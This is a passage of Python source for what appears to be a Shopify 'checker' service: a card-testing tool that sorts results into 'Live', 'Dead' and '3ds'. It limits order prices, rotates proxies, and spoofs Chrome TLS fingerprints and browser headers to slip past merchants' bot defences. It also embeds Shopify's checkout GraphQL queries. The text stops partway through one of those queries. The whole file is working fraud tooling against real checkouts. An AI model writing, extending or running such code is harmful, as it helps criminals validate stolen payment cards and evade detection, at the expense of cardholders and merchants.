import logging
import logging.handlers
import asyncio
import aiohttp
import socket
import time
import random
import os
import json
import re
import threading
import atexit
import signal
from collections import OrderedDict
from urllib.parse import urlparse
from flask import Flask, request, jsonify
from curl_cffi.requests import AsyncSession

try:
    import orjson
    _HAS_ORJSON = True
except ImportError:
    _HAS_ORJSON = False

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.handlers.RotatingFileHandler('checker.log', maxBytes=52428800, backupCount=5, encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('shopify_checker')

_VARIANT_CACHE = {}
_VARIANT_CACHE_LOCK = threading.RLock()
_METRICS = {"Live": 0, "Dead": 0, "3ds": 0, "SITE_ERROR": 0, "PROXY_ERROR": 0, "AMBIGUOUS": 0, "total_requests": 0}
_METRICS_LOCK = threading.Lock()
_CHECKOUT_PROXIES = {}
_CHECKOUT_PROXIES_LOCK = threading.RLock()

EXCHANGE_RATES = {"USD": 1.0, "CAD": 0.73, "AUD": 0.66, "GBP": 1.27, "EUR": 1.08, "NZD": 0.61, "INR": 0.012, "JPY": 0.0064, "SGD": 0.74, "HKD": 0.13, "CHF": 1.10}

_CURRENCY_SYMBOLS = {'USD': '$', 'EUR': '€', 'GBP': '£', 'JPY': '¥', 'CAD': 'CA$', 'AUD': 'AU$', 'NZD': 'NZ$', 'CHF': 'CHF', 'SGD': 'S$', 'HKD': 'HK$', 'INR': '₹', 'SEK': 'SEK', 'NOK': 'NOK', 'DKK': 'DKK', 'MXN': 'MX$', 'BRL': 'R$'}

MAX_PRICE_USD = float(os.environ.get("MAX_PRICE_USD", "20.0"))
MAX_PENDING_ATTEMPTS = int(os.environ.get("MAX_PENDING_ATTEMPTS", "8"))

def format_price(amount, currency):
    try:
        amount = float(amount)
    except (ValueError, TypeError):
        amount = 0.0
    currency = str(currency or "USD").upper()
    symbol = _CURRENCY_SYMBOLS.get(currency, f"{currency} ")
    if currency in ['JPY']:
        return f"{symbol}{int(amount)}"
    return f"{symbol}{amount:.2f}"

def safe_json_loads(text, default=None):
    fallback = {} if default is None else default
    if not text:
        return fallback
    if _HAS_ORJSON:
        try:
            return orjson.loads(text)
        except Exception:
            pass
    try:
        return json.loads(text)
    except Exception:
        logger.warning(f"Failed to parse JSON: {str(text)[:100]}...")
        return fallback

try:
    import uvloop
    uvloop.install()
except ImportError:
    pass

try:
    import resource
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    if hard > soft:
        resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
except Exception as exc:
    logger.debug("Suppressed exception: %s", exc, exc_info=True)

_dns_cache = {}
_original_getaddrinfo = socket.getaddrinfo

_ACCEPT_LANGUAGES = ["en-US,en;q=0.9", "en-US,en;q=0.8", "en-GB,en;q=0.9,en-US;q=0.8", "en-US,en;q=0.9,fr;q=0.8", "en-US,en;q=0.9,es;q=0.8"]
_ACCEPT_ENCODINGS = ["gzip, deflate, br", "gzip, deflate, br, zstd", "gzip, deflate", "gzip, deflate, br"]
_CACHE_CONTROLS = ["max-age=0", "no-cache", "max-age=0"]

def _pick_accept_language():
    return random.choice(_ACCEPT_LANGUAGES)

def _pick_accept_encoding():
    return random.choice(_ACCEPT_ENCODINGS)

def _pick_cache_control():
    return random.choice(_CACHE_CONTROLS)

def _build_ordered_headers(base_headers):
    ordered = OrderedDict()
    order = ['Host', 'Connection', 'Content-Length', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'User-Agent', 'Content-Type', 'Accept', 'Origin', 'Sec-Fetch-Dest', 'Sec-Fetch-Mode', 'Sec-Fetch-Site', 'Sec-Fetch-User', 'Referer', 'Accept-Encoding', 'Accept-Language', 'Cookie', 'DNT', 'Priority']
    lower_map = {k.lower(): (k, v) for k, v in base_headers.items()}
    for name in order:
        if name.lower() in lower_map:
            k, v = lower_map.pop(name.lower())
            ordered[k] = v
    for k, v in lower_map.values():
        ordered[k] = v
    return ordered

_BROWSER_PROFILES = [
    {"impersonate": "chrome120", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', "sec_ch_ua_mobile": "?0", "sec_ch_ua_platform": '"Windows"'},
    {"impersonate": "chrome119", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "sec_ch_ua": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"', "sec_ch_ua_mobile": "?0", "sec_ch_ua_platform": '"Windows"'},
    {"impersonate": "chrome116", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"', "sec_ch_ua_mobile": "?0", "sec_ch_ua_platform": '"Windows"'},
    {"impersonate": "chrome124", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', "sec_ch_ua_mobile": "?0", "sec_ch_ua_platform": '"Windows"'},
]

def _pick_browser_profile():
    return random.choice(_BROWSER_PROFILES)

_SESSION_POOL = {}
_SESSION_POOL_LOCK = None
_SESSION_POOL_MAX = int(os.environ.get("SESSION_POOL_MAX", "100"))
_SESSION_MAX_USES = int(os.environ.get("SESSION_MAX_USES", "50"))
_SESSION_POOL_STATE_LOCK = threading.RLock()

async def _get_pooled_session(impersonate):
    global _SESSION_POOL_LOCK
    if _SESSION_POOL_LOCK is None:
        with _SESSION_POOL_STATE_LOCK:
            if _SESSION_POOL_LOCK is None:
                _SESSION_POOL_LOCK = asyncio.Lock()
    async with _SESSION_POOL_LOCK:
        with _SESSION_POOL_STATE_LOCK:
            pool = _SESSION_POOL.setdefault(impersonate, [])
            while pool:
                session = pool.pop()
                actual = getattr(session, '_impersonate', None)
                if actual and actual != impersonate:
                    try:
                        await session.close()
                    except Exception:
                        pass
                    continue
                uses = getattr(session, '_shopify_uses', 0)
                if uses >= _SESSION_MAX_USES:
                    try:
                        await session.close()
                    except Exception:
                        pass
                    continue
                try:
                    session._shopify_uses = uses + 1
                except Exception:
                    pass
                try:
                    session.cookies.clear()
                except Exception:
                    pass
                return session
    new_sess = AsyncSession(impersonate=impersonate)
    try:
        new_sess._impersonate = impersonate
        new_sess._shopify_uses = 1
    except Exception:
        pass
    return new_sess

async def _return_pooled_session(session, impersonate):
    global _SESSION_POOL_LOCK
    if _SESSION_POOL_LOCK is None:
        with _SESSION_POOL_STATE_LOCK:
            if _SESSION_POOL_LOCK is None:
                _SESSION_POOL_LOCK = asyncio.Lock()
    async with _SESSION_POOL_LOCK:
        with _SESSION_POOL_STATE_LOCK:
            pool = _SESSION_POOL.setdefault(impersonate, [])
            if len(pool) < _SESSION_POOL_MAX:
                pool.append(session)
                return
    try:
        await session.close()
    except Exception as exc:
        logger.debug("Suppressed exception: %s", exc, exc_info=True)

class _CurlCffiResponseAdapter:
    __slots__ = ("_raw", "_closed")
    def __init__(self, raw):
        self._raw = raw
        self._closed = False
    @property
    def status(self):
        return self._raw.status_code
    @property
    def status_code(self):
        return self._raw.status_code
    @property
    def url(self):
        return str(self._raw.url)
    @property
    def headers(self):
        return self._raw.headers
    @property
    def cookies(self):
        try:
            return self._raw.cookies
        except Exception:
            return None
    @property
    def content(self):
        return self._raw.content
    def __getattr__(self, name):
        if name == "_raw":
            raise AttributeError(name)
        return getattr(self._raw, name)
    async def text(self, *args, **kwargs):
        value = self._raw.text
        if callable(value):
            value = value()
        if hasattr(value, "__await__"):
            value = await value
        return value
    async def json(self, *args, **kwargs):
        value = self._raw.json
        if callable(value):
            value = value()
        if hasattr(value, "__await__"):
            value = await value
        return value
    async def read(self, *args, **kwargs):
        value = self._raw.content
        if callable(value):
            value = value()
        if hasattr(value, "__await__"):
            value = await value
        return value
    def close(self):
        if self._closed:
            return None
        self._closed = True
        try:
            return self._raw.close()
        except Exception:
            return None
    def __del__(self):
        try:
            self.close()
        except Exception:
            pass

class AiohttpCurlCffiResponseContextManager:
    __slots__ = ("_pending", "_adapter")
    def __init__(self, pending):
        self._pending = pending
        self._adapter = None
    async def _resolve(self):
        if self._adapter is None:
            pending = self._pending
            if hasattr(pending, "__await__"):
                pending = await pending
            self._adapter = _CurlCffiResponseAdapter(pending)
        return self._adapter
    def __await__(self):
        return self._resolve().__await__()
    async def __aenter__(self):
        return await self._resolve()
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self._adapter is not None:
            self._adapter.close()
        return False

class AiohttpCurlCffiSession:
    def __init__(self, connector=None, connector_owner=False, timeout=None, browser_profile=None):
        self._profile = browser_profile or _pick_browser_profile()
        self.impersonate = self._profile["impersonate"]
        self.session = None
        self._from_pool = False
        self.timeout_sec = 45
        if timeout:
            if hasattr(timeout, 'sock_read') and timeout.sock_read is not None:
                self.timeout_sec = timeout.sock_read
            elif hasattr(timeout, 'total') and timeout.total is not None:
                self.timeout_sec = min(45, timeout.total)
            elif isinstance(timeout, (int, float)):
                self.timeout_sec = timeout
    @property
    def browser_profile(self):
        return self._profile
    async def __aenter__(self):
        self.session = await _get_pooled_session(self.impersonate)
        self._from_pool = True
        return self
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            if exc_type is None:
                await _return_pooled_session(self.session, self.impersonate)
            else:
                try:
                    await self.session.close()
                except Exception as exc:
                    logger.debug("Suppressed exception: %s", exc, exc_info=True)
            self.session = None
    def _convert_kwargs(self, kwargs):
        new_kwargs = kwargs.copy()
        if "proxy" in new_kwargs:
            proxy = new_kwargs.pop("proxy")
            if proxy:
                if not proxy.startswith('http') and not proxy.startswith('socks'):
                    proxy = f"http://{proxy}"
                new_kwargs["proxies"] = {"http": proxy, "https": proxy}
        if "timeout" in new_kwargs:
            t = new_kwargs["timeout"]
            if hasattr(t, 'sock_read') and t.sock_read is not None:
                new_kwargs["timeout"] = t.sock_read
            elif hasattr(t, 'total') and t.total is not None:
                new_kwargs["timeout"] = t.total
        return new_kwargs
    def get(self, url, **kwargs):
        converted = self._convert_kwargs(kwargs)
        if "timeout" not in converted:
            converted["timeout"] = self.timeout_sec
        return AiohttpCurlCffiResponseContextManager(self.session.get(url, **converted))
    def post(self, url, **kwargs):
        converted = self._convert_kwargs(kwargs)
        if "timeout" not in converted:
            converted["timeout"] = self.timeout_sec
        return AiohttpCurlCffiResponseContextManager(self.session.post(url, **converted))
        
# GraphQL Queries
QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{... on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}... on CheckpointDenied{redirectUrl __typename}... on Throttled{pollAfter queueToken pollUrl __typename}... on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml... on RemoveTermViolation{target __typename}... on AcceptNewTermViolation{target __typename}... on ConfirmChangeViolation{from to __typename}... on UnprocessableTermViolation{target __typename}... on UnresolvableTermViolation{target __typename}... on ApplyChangeViolation{target from{... on ApplyChangeValueInt{value __typename}... on ApplyChangeValueRemoval{value __typename}... on ApplyChangeValueString{value __typename}__typename}to{... on ApplyChangeValueInt{value __typename}... on ApplyChangeValueRemoval{value __typename}... on ApplyChangeValueString{value __typename}__typename}__typename}... on GenericError{__typename}... on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{... on FilledBuyerIdentityTerms{email phone customer{... on CustomerProfile{email __typename}... on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{... on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{... on RetailAttributions{deviceId locationId userId __typename}... on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{... on SaleAttribution{recipient{... on StaffMember{id __typename}... on Location{id __typename}... on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment... on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename... on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{... on DiscountAllocatedAllocationSet{__typename allocations{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{... on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on DiscountCodeTrigger{code __typename}... on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename... on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{... on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}... on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{... on CompleteDeliveryStrategy{handle __typename}... on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{... on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{... on IntIntervalConstraint{lowerBound upperBound __typename}... on IntValueConstraint{value __typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{... on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{... on MerchandiseLine{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on MerchandiseBundleLineComponent{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on MerchandiseLineComponentWithCapabilities{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{... on SourceProvidedMerchandise{__typename requiresShipping}... on ProductVariantMerchandise{__typename requiresShipping}... on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}... on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{... on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{... on MerchandisePropertyValueString{string:value __typename}... on MerchandisePropertyValueInt{int:value __typename}... on MerchandisePropertyValueFloat{float:value __typename}... on MerchandisePropertyValueBoolean{boolean:value __typename}... on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{... on LineComponentDiscountAllocation{allocation{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{... on PendingTerms{taskId pollDelay __typename}... on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{... on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{... on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}... on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{... on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{... on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{... on IntIntervalConstraint{lowerBound upperBound __typename}... on IntValueConstraint{value __typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{... on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}__typename}payment{... on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{... on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}... on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}... on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}... on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename... on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}... on WalletsPlatformConfiguration{name configurationParams __typename}... on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}... on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}... on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}... on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}... on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}... on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}... on AmazonPayClassicWalletConfig{__typename name orderingIndex}... on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{... on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}... on 